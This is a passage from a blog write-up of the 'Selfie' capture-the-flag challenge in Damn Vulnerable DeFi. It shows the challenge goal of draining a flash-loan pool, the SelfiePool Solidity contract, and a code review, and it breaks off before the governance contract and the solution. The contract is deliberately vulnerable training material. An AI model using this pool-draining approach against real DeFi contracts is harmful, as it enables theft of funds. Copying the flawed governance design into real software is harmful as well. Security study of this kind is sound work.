@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #6 - Selfie - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #6 - Selfie" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #6 - Selfie&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-14T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #6 - Selfie"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #6 - Selfie&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #6 - Selfie",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_06_selfie\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1456 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_06_selfie\/","datePublished": "2022-09-14T00:00:00+00:00","dateModified": "2022-09-14T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #6 - Selfie</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 14, 2022">September 14, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1456 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #6 - Selfie&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>A new cool lending pool has launched! It&rsquo;s now offering flash loans of DVT tokens.</p>
+<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>
+<p>What could go wrong, right ?</p>
+<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all. (<a href="https://www.damnvulnerabledefi.xyz/challenges/6.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>For this challenge, we have two contracts: <code>SimpleGovernance</code>, responsible for adding and executing actions and <code>SelfiePool</code>, accountable for offering flash loans.</p>
+<p><code>SelfiePool</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/selfie/SelfiePool.sol" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">SelfiePool</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ERC20Snapshot</span> <span style="color:#00f">public</span> <span style="color:#000">token</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">SimpleGovernance</span> <span style="color:#00f">public</span> <span style="color:#000">governance</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">FundsDrained</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">receiver</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">modifier</span> <span style="color:#000">onlyGovernance</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#00f">address</span>(<span style="color:#000">governance</span>), <span style="color:#5a2">&#34;Only governance can execute this action&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">tokenAddress</span>, <span style="color:#00f">address</span> <span style="color:#000">governanceAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#000">ERC20Snapshot</span>(<span style="color:#000">tokenAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">governance</span> = <span style="color:#000">SimpleGovernance</span>(<span style="color:#000">governanceAddress</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">external</span> <span style="color:#000">nonReentrant</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balanceBefore</span> = <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">balanceBefore</span> &gt;= <span style="color:#000">borrowAmount</span>, <span style="color:#5a2">&#34;Not enough tokens in pool&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span>.<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">borrowAmount</span>);        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>.<span style="color:#000">isContract</span>(), <span style="color:#5a2">&#34;Sender must be a deployed contract&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">msg</span>.<span style="color:#000">sender</span>.<span style="color:#000">functionCall</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">abi</span>.<span style="color:#000">encodeWithSignature</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;receiveTokens(address,uint256)&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#00f">address</span>(<span style="color:#000">token</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#000">borrowAmount</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balanceAfter</span> = <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">balanceAfter</span> &gt;= <span style="color:#000">balanceBefore</span>, <span style="color:#5a2">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">drainAllFunds</span>(<span style="color:#00f">address</span> <span style="color:#000">receiver</span>) <span style="color:#00f">external</span> <span style="color:#000">onlyGovernance</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amount</span> = <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span>.<span style="color:#000">transfer</span>(<span style="color:#000">receiver</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">FundsDrained</span>(<span style="color:#000">receiver</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<ul>
+<li><code>flashLoan</code> function (the logic of this function is very similar to the one of <a href="[link]%28/posts/damnvulnerabledefi_02_naive-receiver/%29" rel="">Challange #2</a>:
+<ul>
+<li>prevents reentrancy by using the <code>nonReentrant</code> modifier (from <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener noreffer ">ReentrancyGuard</a>)</li>
+<li>checks if the ETH balance of the contract is greater or equal to the amount we want to borrow (line <code>34</code>)</li>
+<li>transfers to <code>msg.sender</code> the amount requested</li>
+<li>checks if the borrower (<code>msg.sender</code>) is a contract (line <code>38</code>)</li>
+<li>calls the <code>receiveTokens</code> function of the borrower contract (line <code>41</code>) passing the token address and the borrowed amount</li>
+<li>checks if we paid back the loan (line <code>49</code>)</li>
+</ul>
+</li>
+<li><code>drainAllFunds</code> transfer all the pool balance to a <code>recevier</code> address. Only the governance contract can call this function (because of the <code>onlyGovernance</code> modifier - line <code>22</code>)</li>
+</ul>
+<p>The core of this challenge is in <code>SimpleGovernance</code>(<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/selfie/SimpleGovernance.sol" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">92
